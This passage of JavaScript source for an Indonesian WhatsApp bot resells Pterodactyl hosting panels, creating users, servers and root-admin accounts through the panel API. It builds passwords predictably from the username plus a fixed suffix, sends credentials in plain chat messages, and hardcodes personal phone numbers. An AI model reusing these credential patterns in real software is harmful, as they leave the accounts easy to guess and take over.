"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "7gb": {
if (!isPrem) return reply(`Anda Belum Menjadi Reseler Beli Reseler Skrng Di Kyy agar Bisa Mengakses Fitur Cpanel`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "175"
let disk = "7000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
• ɢᴀʀᴀɴsɪ ᴄᴜᴍᴀ 1x
• ᴋʟᴀɪᴍ ɢᴀʀᴀɴsɪ ʜᴀʀᴜs sᴇɴᴅ ʙᴜᴋᴛɪ ᴘᴇᴍʙᴇʟɪᴀɴ
• ᴊᴀɴɢᴀɴ ʀᴜsᴜʜ sᴇʀᴠᴇʀ ʟᴀɪɴ
• ᴄʀᴇᴀᴛ ᴘᴀɴᴇʟ sᴇᴄᴜᴋᴜᴘɴʏᴀ

GROUP OFICIAL
• https://chat.whatsapp.com/I9mpo2iIuadBdkee7EZnz4

OWNER
wa.me/+6285774380068
`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "unli": {
       if (!isPrem) return reply(`ᴋʜᴜsᴜs ᴋʏ`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
• ɢᴀʀᴀɴsɪ ᴄᴜᴍᴀ 1x
• ᴋʟᴀɪᴍ ɢᴀʀᴀɴsɪ ʜᴀʀᴜs sᴇɴᴅ ʙᴜᴋᴛɪ ᴘᴇᴍʙᴇʟɪᴀɴ
• ᴊᴀɴɢᴀɴ ʀᴜsᴜʜ sᴇʀᴠᴇʀ ʟᴀɪɴ
• ᴄʀᴇᴀᴛ ᴘᴀɴᴇʟ sᴇᴄᴜᴋᴜᴘɴʏᴀ

GROUP OFICIAL
• https://chat.whatsapp.com/G7zBGPIRHPrKwR77jANGHY

OWNER
wa.me/+6288286326619
`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "8gb": {
if (!isPrem) return reply(`ʙᴜʏ ᴘʀᴇᴍ ᴅʟᴜ ᴅɪ ᴋʏʏ`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "200"
let disk = "8000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
• ɢᴀʀᴀɴsɪ ᴄᴜᴍᴀ 1x
• ᴋʟᴀɪᴍ ɢᴀʀᴀɴsɪ ʜᴀʀᴜs sᴇɴᴅ ʙᴜᴋᴛɪ ᴘᴇᴍʙᴇʟɪᴀɴ
• ᴊᴀɴɢᴀɴ ʀᴜsᴜʜ sᴇʀᴠᴇʀ ʟᴀɪɴ
• ᴄʀᴇᴀᴛ ᴘᴀɴᴇʟ sᴇᴄᴜᴋᴜᴘɴʏᴀ

GROUP OFICIAL
• https://chat.whatsapp.com/G7zBGPIRHPrKwR77jANGHY

OWNER
wa.me/+6288286326619
`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "ramlist":

lrm = `RAM YANG TERSEDIA :
1GB ✅
2GB ✅
3GB ✅
4GB ✅
5GB ✅
6GB ✅️
7GB ✅️
8GB ✅️
UNLI (KHUSUS ADMIN SERVER)`
kyy.sendMessage(from, {text : lrm}, {quoted : fcall})
break 
case 'panel': {
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username2 = t[0];
let u2 = t[1];

let sections = [{
title: 'ʟɪsᴛ',
highlight_label: 'Recomended',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.unli ${username2},${u2}`
},
{
title: '1Gb', 
description: "1Gb Ram/50 Cpu", 
id: `.1gb ${username2},${u2}`
},
{
title: '2Gb', 
description: "2Gb Ram/70 Cpu", 
id: `.2gb ${username2},${u2}`
},
{
title: '3Gb', 
description: "3Gb Ram/100 Cpu", 
id: `.3gb ${username2},${u2}`
},
{
title: '4Gb', 
description: "4Gb Ram/125 Cpu", 
id: `.4gb ${username2},${u2}`
},
{
title: '5Gb', 
description: "5Gb Ram/150 Cpu", 
id: `.5gb ${username2},${u2}`
},
{
title: '6Gb', 
description: "6Gb Ram/175 Cpu", 
id: `.6gb ${username2},${u2}`
},
{
title: '7Gb', 
description: "7Gb Ram/175 Cpu", 
id: `.7gb ${username2},${u2}`
},
{
title: '8Gb', 
description: "8Gb Ram/200 Cpu", 
id: `.8gb ${username2},${u2}`
}]
}]

let listMessage = {
    title: 'List Panel', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By ᴋʏʏ', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kyy.decodeJid(kyy.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Please choose the size you want to buy`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `ʙᴜʏ ᴘᴀɴᴇʟ ʀᴇᴋ`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/9e9076678d390b21556e5.jpg" } }, { upload: kyy.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await kyy.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'reinstall': {
if (!isCreator) return reply(mess.owner)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break
case "detusr": {
if (!isCreator) return reply(`*Anda Belum Menjadi Reseler Beli Reseler Skrng Di Kyy agar Bisa Mengakses Fitur Cpanel!*`)
let usr = args[0]
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
let u = res.attributes
reply(`*${u.username.toUpperCase()} USER DETAILS*

\`\`\`ID: ${u.id}
UUID: ${u.uuid}
USERNAME: ${u.username}
EMAIL: ${u.email}
NAME: ${u.first_name} ${u.last_name}
LANGUAGE: ${u.language}
ADMIN: ${u.root_admin}
CREATED AT: ${u.created_at}\`\`\``)
}
break
case 'updatesrv': {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 4) return reply(`*Format salah*

Penggunaan: 
${prefix + command} srvId,locId,memory/disk,cpu`)
let srv = t[0];
let loc = t[1];
let memo_disk = t[2].split`/`;
let cpu = t[3];
let f1 = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json()

let f = await fetch(domain + "/api/application/servers/" + srv + "/build", {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"allocation": parseInt(loc) || data.attributes.allocation,
"memory": memo_disk[0] || data.attributes.limits.memory,
"swap": data.attributes.limits.swap || 0,
"disk": memo_disk[1] || data.attributes.limits.disk,
"io": 500,
"cpu": cpu || data.attributes.limits.cpu,
"threads": null,
"feature_limits": {
"databases": 5,
"allocations": 5,
"backups": 5
}
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY UPDATED THE SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${tanggal2}
UPDATED AT: ${server.updated_at}`)
}
break
case "listsrv": {
  if (!isCreator) return reply(`ᴋʜᴜsᴜs ᴋʏʏ.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey2
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await kyy.sendMessage(m.chat, { text: messageText }, { quoted: fcall });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "listusr": {
  if (!isCreator) return reply(mess.premium)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await kyy.sendMessage(m.chat, { text: messageText }, { quoted: fcall });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "delsrv": {
      if (!isCreator) return reply(`ᴋʜᴜsᴜs ᴋʏʏ`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
case "delusr": {
  if (!isCreator) return reply(`ᴋʜᴜsᴜs ᴋʏʏ`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
case "addusr": {
let s = text.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let u = m.quoted ? m.quoted.sender : s[1] ? s[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : s[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal2}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`

let sections = [{
title: 'Paket Server Panel',
highlight_label: 'Recomended',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,0/0,0`
},
{
title: '1Gb', 
description: "1Gb Ram/50 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,1200/1200,50`
},
{
title: '2Gb', 
description: "2Gb Ram/70 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,2200/2200,70`
},
{
title: '3Gb', 
description: "3Gb Ram/100 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,3200/3200,100`
},
{
title: '4Gb', 
description: "4Gb Ram/125 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,4200/4200,125`
},
{
title: '5Gb', 
description: "5Gb Ram/150 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,5200/5200,150`
},
{
title: '6Gb', 
description: "6Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,6200/6200,175`
},
{
title: '7Gb', 
description: "7Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,7200/7200,175`
},
{
title: '8Gb', 
description: "8Gb Ram/200 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,8200/8200,200`
}]
}]

let listMessage = {
    title: 'List Panel', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '828283838@newsletter',
 newsletterName: 'Powered By ᴋʏʏ', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kyy.decodeJid(kyy.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`ʙᴜʏ ᴘᴀɴᴇʟ ᴅ ᴋʏʏ ʏᴏᴋ`),
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/9e9076678d390b21556e5.jpg" } }, { upload: kyy.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await kyy.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
kyy.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break
case "admin": {
if (!isCreator) return reply(`ᴋʜᴜsᴜs ᴋʏʏ`)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await kyy.sendMessage(m.chat, listMessage)

    await kyy.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
• ɢᴀʀᴀɴsɪ ᴄᴜᴍᴀ 1x
• ᴋʟᴀɪᴍ ɢᴀʀᴀɴsɪ ʜᴀʀᴜs sᴇɴᴅ ʙᴜᴋᴛɪ ᴘᴇᴍʙᴇʟɪᴀɴ
• ᴊᴀɴɢᴀɴ ʀᴜsᴜʜ sᴇʀᴠᴇʀ ʟᴀɪɴ
• ᴄʀᴇᴀᴛ ᴘᴀɴᴇʟ sᴇᴄᴜᴋᴜᴘɴʏᴀ

GROUP OFICIAL
• https://chat.whatsapp.com/G7zBGPIRHPrKwR77jANGHY

OWNER
wa.me/+6288286326619


`,

    })

} 
break
case "listadmin": {
  if (!isCreator) return reply(`ᴋʜᴜsᴜs ᴋʏʏ.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await kyy.sendMessage(m.chat, { text: messageText }, { quoted: fcall });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "addsrv": {
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break
case 'spanel': case 'sendpanel': {
		 if (!isCreator) return reply(`ᴋʜᴜsᴜs ᴋʏʏ`)
          if (!text) return reply(`Example : ${prefix + command} 6285xxxxx,harga,linklog`)
            reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
